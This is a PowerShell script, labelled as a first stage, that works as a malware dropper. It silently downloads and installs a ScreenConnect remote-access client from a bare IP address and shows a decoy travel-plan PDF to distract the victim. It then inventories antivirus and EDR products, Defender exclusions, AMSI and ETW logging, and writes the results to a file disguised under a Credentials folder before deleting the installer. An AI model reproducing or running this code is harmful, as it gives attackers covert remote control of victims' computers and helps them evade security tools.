$ErrorActionPreference = 'SilentlyContinue'

# === STAGE 1: AV Detection + ScreenConnect + PDF Delivery ===

# --- Path Setup ---
$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
$localAppData = [System.IO.Path]::GetFolderPath('LocalApplicationData')
$downloads = "$env:USERPROFILE\Downloads"
$tempDir = $env:TEMP
$desktop = [System.Environment]::GetFolderPath('Desktop')
$powerPath = "$appData\Microsoft\Credentials\power.txt"

# --- 1. ScreenConnect Silent Install ---
$msiUrl = "http://96.30.206.19:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msiPath = "$tempDir\ScreenConnect.ClientSetup.msi"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc.DownloadFile($msiUrl, $msiPath)
    
    # Silent install
    Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
} catch {}

# --- 2. Open PDF in Default Browser ---
$pdfUrl = "https://raw.githubusercontent.com/slynet999-coder/Yambo/main/Travel_Plan_Meeting_Q4_2026.pdf"
$pdfPath = "$tempDir\Travel_Plan_Meeting_Q4_2026.pdf"

try {
    $wc2 = New-Object System.Net.WebClient
    $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc2.DownloadFile($pdfUrl, $pdfPath)
    Start-Process $pdfPath
} catch {}

# --- 3. AV Detection Scan ---
$avList = @()
$avFound = @{}

# Method 1: WMI SecurityCenter2
try {
    $avProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction Stop
    foreach ($av in $avProducts) {
        $name = $av.displayName
        $state = $av.productState
        $stateHex = "0x{0:X6}" -f $state
        
        # Decode state
        $status = "Unknown"
        switch ([int]($state / 1000)) {
            0 { $status = "Off" }
            1 { $status = "On" }
            2 { $status = "Snoozed" }
            3 { $status = "Expired" }
        }
        
        $avFound[$name] = @{
            Name = $name
            State = $stateHex
            Status = $status
            Path = $av.pathToSignedProductExe
            GUID = $av.instanceGuid
        }
    }
} catch {}

# Method 2: Registry checks
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)

$avKeywords = @(
    "antivirus", "anti-virus", "security", "defender", "endpoint",
    "protection", "malware", "firewall", "norton", "mcafee", "kaspersky",
    "bitdefender", "avast", "avg", "eset", "sophos", "trend", "webroot",
    "carbon", "crowdstrike", "sentinel", "cylance", "symantec", "broadcom",
    "malwarebytes", "hitman", "f-secure", "bullguard", "panda", "zonealarm",
    "comodo", "windows defender"
)

foreach ($regPath in $regPaths) {
    try {
        $apps = Get-ItemProperty $regPath -ErrorAction Stop
        foreach ($app in $apps) {
            $appName = $app.DisplayName
            if ($appName) {
                foreach ($kw in $avKeywords) {
                    if ($appName -match $kw) {
                        if (-not $avFound.ContainsKey($appName)) {
                            $avFound[$appName] = @{
                                Name = $appName
                                State = "N/A"
                                Status = "Installed"
                                Path = $app.InstallLocation
                                GUID = $app.PSChildName
                            }
                        }
                        break
                    }
                }
            }
        }
    } catch {}
}

# Method 3: Running processes
$avProcesses = @(
    "MsMpEng", "NisSrv", "SenseIR", "SenseCncProxy", "SenseNdr",
    "ccSvcHst", "mcshield", "mcnasvc", "kavtray", "avpui", "avp",
    "bdagent", "bdservicehost", "avgsvc", "avguirn", "ekrn",
    "sophos", "SavApi", "SavService", "tmccsf", "tmlisten",
    "TMBMSRV", "tmproxy", "wrsa", "wrsky", "mbam",
    "cb", "RepUtils", "RepWAV", "RepUX"
)

foreach ($proc in Get-Process -ErrorAction SilentlyContinue) {
    foreach ($avProc in $avProcesses) {
        if ($proc.Name -match $avProc) {
            $procName = $proc.Name
            if (-not $avFound.ContainsKey($procName)) {
                $avFound[$procName] = @{
                    Name = $procName
                    State = "Running"
                    Status = "Active"
                    Path = $proc.Path
                    GUID = "process-detected"
                }
            }
        }
    }
}

# Method 4: Windows Defender specific
try {
    $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
    $defenderInfo = @{
        Name = "Windows Defender"
        State = if ($defenderStatus.AntivirusEnabled) { "On" } else { "Off" }
        Status = $defenderStatus.RealTimeProtectionEnabled
        Path = "Windows Defender"
        GUID = "Defender-Status"
        AntivirusEnabled = $defenderStatus.AntivirusEnabled
        RealTimeProtection = $defenderStatus.RealTimeProtectionEnabled
        SignatureVersion = $defenderStatus.AntivirusSignatureVersion
        SignatureDate = $defenderStatus.AntivirusSignatureLastUpdated
    }
    $avFound["Windows Defender"] = $defenderInfo
} catch {}

# Method 5: Windows Defender exclusions (potential evasion indicators)
$defenderExclusions = @()
try {
    $exclusions = Get-MpPreference -ErrorAction Stop
    if ($exclusions.ExclusionPath) { $defenderExclusions += $exclusions.ExclusionPath }
    if ($exclusions.ExclusionProcess) { $defenderExclusions += $exclusions.ExclusionProcess }
    if ($exclusions.ExclusionExtension) { $defenderExclusions += $exclusions.ExclusionExtension }
} catch {}

# Method 6: AMSI status
$amsiStatus = "Unknown"
try {
    $amsiDll = Get-Item "C:\Windows\System32\amsi.dll" -ErrorAction Stop
    $amsiStatus = "Present (v$($amsiDll.VersionInfo.FileVersion))"
} catch {
    $amsiStatus = "Not Found or Restricted"
}

# Method 7: ETW / Logging status
$etwStatus = @{}
try {
    $etwProviders = wevtutil el 2>$null | Select-String -Pattern "Microsoft-Windows-Threat-Intelligence|Microsoft-Antimalware-Scan-Interface|Microsoft-Windows-Windows Defender"
    $etwStatus["ThreatIntelligence"] = if ($etwProviders -match "Threat-Intelligence") { "Active" } else { "Not Found" }
    $etwStatus["AMSI"] = if ($etwProviders -match "AMSI") { "Active" } else { "Not Found" }
    $etwStatus["Defender"] = if ($etwProviders -match "Defender") { "Active" } else { "Not Found" }
} catch {}

# --- 4. Build Output ---
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$output = @()
$output += "=" * 60
$output += "SYSTEM SECURITY REPORT"
$output += "Generated: $timestamp"
$output += "Computer: $env:COMPUTERNAME"
$output += "User: $env:USERNAME"
$output += "Domain: $env:USERDOMAIN"
$output += "OS: $([System.Environment]::OSVersion.VersionString)"
$output += "=" * 60
$output += ""

$output += "[DETECTED SECURITY PRODUCTS]"
$output += "-" * 40

if ($avFound.Count -eq 0) {
    $output += "No security products detected"
} else {
    foreach ($key in $avFound.Keys) {
        $av = $avFound[$key]
        $output += "Name: $($av.Name)"
        $output += "  State: $($av.State)"
        $output += "  Status: $($av.Status)"
        if ($av.Path) { $output += "  Path: $($av.Path)" }
        if ($av.SignatureVersion) { $output += "  Signatures: $($av.SignatureVersion)" }
        if ($av.RealTimeProtection -ne $null) { $output += "  RTP: $($av.RealTimeProtection)" }
        $output += ""
    }
}

$output += "[DEFENDER CONFIGURATION]"
$output += "-" * 40
$output += "AMSI: $amsiStatus"
$output += ""

if ($defenderExclusions.Count -gt 0) {
    $output += "Exclusions Found:"
    foreach ($exc in $defenderExclusions) {
        $output += "  - $exc"
    }
} else {
    $output += "No exclusions configured"
}
$output += ""

$output += "[ETW / LOGGING STATUS]"
$output += "-" * 40
foreach ($key in $etwStatus.Keys) {
    $output += "$key`: $($etwStatus[$key])"
}
$output += ""

$output += "[SYSTEM INFO]"
$output += "-" * 40
$output += "Architecture: $env:PROCESSOR_ARCHITECTURE"
$output += "Processors: $env:NUMBER_OF_PROCESSORS"
$output += "RAM: $([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB"
$output += ""

$output += "=" * 60
$output += "GO"
$output += "=" * 60

# --- 5. Write to power.txt ---
$outputText = $output -join "`n"

try {
    $dir = Split-Path $powerPath -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [System.IO.File]::WriteAllText($powerPath, $outputText, [System.Text.Encoding]::UTF8)
} catch {
    # Fallback path
    $powerPath = "$desktop\power.txt"
    [System.IO.File]::WriteAllText($powerPath, $outputText, [System.Text.Encoding]::UTF8)
}

# --- 6. Cleanup MSI ---
try { Remove-Item $msiPath -Force -ErrorAction SilentlyContinue } catch {}
